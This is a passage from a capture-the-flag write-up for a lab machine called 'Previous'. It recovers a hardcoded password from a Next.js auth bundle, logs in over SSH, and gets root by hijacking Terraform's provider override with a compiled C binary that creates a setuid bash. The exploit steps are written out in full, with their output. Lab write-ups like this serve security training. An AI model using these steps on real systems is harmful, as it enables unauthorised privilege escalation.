"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovexxxxxxxx")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
```

There we go, found out credentials for `jeremy`. <br>
&rarr; `jeremy:MyNameIsJeremyAndILovexxxxxxxx`

```bash
└─$ ssh jeremy@10.129.xx.xx     
jeremy@10.129.xx.xx's password: 
jeremy@previous:~$ ls -la
total 36
drwxr-x--- 4 jeremy jeremy 4096 Aug 21 20:24 .
drwxr-xr-x 3 root   root   4096 Aug 21 20:09 ..
lrwxrwxrwx 1 root   root      9 Aug 21 19:57 .bash_history -> /dev/null
-rw-r--r-- 1 jeremy jeremy  220 Aug 21 17:28 .bash_logout
-rw-r--r-- 1 jeremy jeremy 3771 Aug 21 17:28 .bashrc
drwx------ 2 jeremy jeremy 4096 Aug 21 20:09 .cache
drwxr-xr-x 3 jeremy jeremy 4096 Aug 21 20:09 docker
-rw-r--r-- 1 jeremy jeremy  807 Aug 21 17:28 .profile
-rw-rw-r-- 1 jeremy jeremy  150 Aug 21 18:48 .terraformrc
-rw-r----- 1 root   jeremy   33 Aug 24 03:35 user.txt
jeremy@previous:~$ cat user.txt
bc9aa9xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Grab our `user.txt` flag.

## Initial Access
After we are in `jeremy` user, let's check out some sudo permissions and recon around the machine.

### Sudo Permissions
```bash
jeremy@previous:~$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

So we can leverage `terraform` to get root.

### Terraform Discovery
Take a google to understand a bit about `terraform` and found out [Terraform Command Line Interface](https://developer.hashicorp.com/terraform/cli/commands) so we know that `terraform` is a tool to manage infrastructure as code.

```bash
jeremy@previous:~$ ls -la
total 36
drwxr-x--- 4 jeremy jeremy 4096 Aug 21 20:24 .
drwxr-xr-x 3 root   root   4096 Aug 21 20:09 ..
lrwxrwxrwx 1 root   root      9 Aug 21 19:57 .bash_history -> /dev/null
-rw-r--r-- 1 jeremy jeremy  220 Aug 21 17:28 .bash_logout
-rw-r--r-- 1 jeremy jeremy 3771 Aug 21 17:28 .bashrc
drwx------ 2 jeremy jeremy 4096 Aug 21 20:09 .cache
drwxr-xr-x 3 jeremy jeremy 4096 Aug 21 20:09 docker
-rw-r--r-- 1 jeremy jeremy  807 Aug 21 17:28 .profile
-rw-rw-r-- 1 jeremy jeremy  150 Aug 21 18:48 .terraformrc
-rw-r----- 1 root   jeremy   33 Aug 24 03:35 user.txt
```

So take a look at home directory, we found out `.terraformrc` file.

```bash
jeremy@previous:~$ cat .terraformrc 
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/usr/local/go/bin"
        }
        direct {}
}
```

This one is a configuration file that `terraform` will use provider binary from `/usr/local/go/bin`.

From this path `/usr/bin/terraform -chdir\=/opt/examples apply`, let's check out `/opt/examples`.

> *What to know option `-chdir` is used for, check out `/usr/bin/terraform -h`*

```bash
jeremy@previous:/opt$ ls -la
total 20
drwxr-xr-x  5 root root 4096 Aug 21 20:09 .
drwxr-xr-x 18 root root 4096 Aug 21 20:23 ..
drwx--x--x  4 root root 4096 Aug 21 20:09 containerd
drwxr-xr-x  3 root root 4096 Aug 24 13:25 examples
drwxr-xr-x  3 root root 4096 Aug 21 20:09 terraform-provider-examples
```

```bash
jeremy@previous:/opt/examples$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Aug 24 13:28 .
drwxr-xr-x 5 root root 4096 Aug 21 20:09 ..
-rw-r--r-- 1 root root   18 Apr 12 20:32 .gitignore
-rw-r--r-- 1 root root  576 Aug 21 18:15 main.tf
drwxr-xr-x 3 root root 4096 Aug 21 20:09 .terraform
-rw-r--r-- 1 root root  247 Aug 21 18:16 .terraform.lock.hcl
-rw-r--r-- 1 root root 1097 Aug 24 13:28 terraform.tfstate
```

Check out `main.tf` file.

```bash
jeremy@previous:/opt/examples$ cat main.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

So this is a terraform module that will copy the file from `/root/examples/hello-world.ts` to `/home/jeremy/docker/previous/public/examples/hello-world.ts`.

Here is the assumption, what if we modify the `.terraformrc` to `/tmp` cause we have the right to do that. And then we will create a `SUID` file within `C` and complied it to `terraform-provider-examples` then run to apply and we got root. <br>
&rarr; Let's try it out.

## Privilege Escalation
### Terraform Exploit
First we will modify the `.terraformrc`.

```bash
jeremy@previous:/opt/examples$ cat > ~/.terraformrc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp"
  }
  direct {}
}
EOF
```

Then we gonna create a `pwn.c` file contains `SUID` binary.

```bash
jeremy@previous:/tmp$ cat > pwn.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");
    return 0;
}
EOF
```

Now let's compile and add execute permission.

```bash
jeremy@previous:/tmp$ gcc pwn.c -o /tmp/terraform-provider-examples
jeremy@previous:/tmp$ chmod +x terraform-provider-examples
```

Then we run `terraform` to apply.

```bash
jeremy@previous:/opt/examples$ sudo /usr/bin/terraform -chdir=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /tmp
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider previous.htb/terraform/examples: failed to instantiate provider "previous.htb/terraform/examples" to obtain schema: Unrecognized remote plugin message: 
│ Failed to read any lines from plugin's stdout
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
│ 
│ Additional notes about plugin:
│   Path: /tmp/terraform-provider-examples
│   Mode: -rwxrwxr-x
│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│   ELF architecture: EM_X86_64 (current architecture: amd64)
│ ..
╵
```

```bash
jeremy@previous:/tmp$ ls -la
total 1440
drwxrwxrwt 13 root   root      4096 Aug 24 14:31 .
drwxr-xr-x 18 root   root      4096 Aug 21 20:23 ..
-rwsr-sr-x  1 root   root   1396520 Aug 24 14:31 bash
drwxrwxrwt  2 root   root      4096 Aug 24 03:35 .font-unix
drwxrwxrwt  2 root   root      4096 Aug 24 03:35 .ICE-unix
-rw-rw-r--  1 jeremy jeremy     158 Aug 24 14:30 pwn.c
drwx------  3 root   root      4096 Aug 24 03:35 systemd-private-43ecc6467376485089d77d72d6e9d57e-ModemManager.service-ozAkLV
drwx------  3 root   root      4096 Aug 24 03:35 systemd-private-43ecc6467376485089d77d72d6e9d57e-systemd-logind.service-oImfWS
drwx------  3 root   root      4096 Aug 24 03:35 systemd-private-43ecc6467376485089d77d72d6e9d57e-systemd-resolved.service-KsIn18
drwx------  3 root   root      4096 Aug 24 03:35 systemd-private-43ecc6467376485089d77d72d6e9d57e-systemd-timesyncd.service-cuIkgQ
drwx------  3 root   root      4096 Aug 24 04:21 systemd-private-43ecc6467376485089d77d72d6e9d57e-upower.service-2YySA7
-rwxrwxr-x  1 jeremy jeremy   16048 Aug 24 14:30 terraform-provider-examples
-rw-rw-r--  1 jeremy jeremy     107 Aug 24 14:22 .terraformrc
drwxrwxrwt  2 root   root      4096 Aug 24 03:35 .Test-unix
drwx------  2 root   root      4096 Aug 24 03:36 vmware-root_608-2722828967
drwxrwxrwt  2 root   root      4096 Aug 24 03:35 .X11-unix
drwxrwxrwt  2 root   root      4096 Aug 24 03:35 .XIM-unix
```

So we got `bash` with `SUID` permission, let's run it.

```bash
jeremy@previous:/tmp$ /tmp/bash -p
bash-5.1# id
uid=1000(jeremy) gid=1000(jeremy) euid=0(root) egid=0(root) groups=0(root),1000(jeremy)
```

There we go, we got root.

```bash
bash-5.1# ls -la
total 56
drwx------ 10 root root 4096 Aug 24 03:35 .
drwxr-xr-x 18 root root 4096 Aug 21 20:23 ..
lrwxrwxrwx  1 root root    9 Aug 21 19:57 .bash_history -> /dev/null
-rw-r--r--  1 root root 3142 Aug 21 18:06 .bashrc
drwx------  3 root root 4096 Aug 21 18:09 .cache
drwxr-xr-x  2 root root 4096 Aug 21 18:41 clean
drwxr-xr-x  4 root root 4096 Aug 21 18:09 .config
drwxr-xr-x  2 root root 4096 Apr 12 20:32 examples
drwxr-xr-x  3 root root 4096 Apr 11 15:21 go
drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Aug 24 03:35 root.txt
drwx------  2 root root 4096 Aug 21 18:53 .ssh
drwxr-xr-x  3 root root 4096 Aug 21 18:12 .terraform.d
-rw-r--r--  1 root root  150 Aug 21 18:48 .terraformrc
bash-5.1# cat root.txt
f11427xxxxxxxxxxxxxxxxxxxxxxxxxx
```

BOOM! Nailed the `root.txt` flag.

![result](/assets/img/previous-htb-release-area-machine/result.png)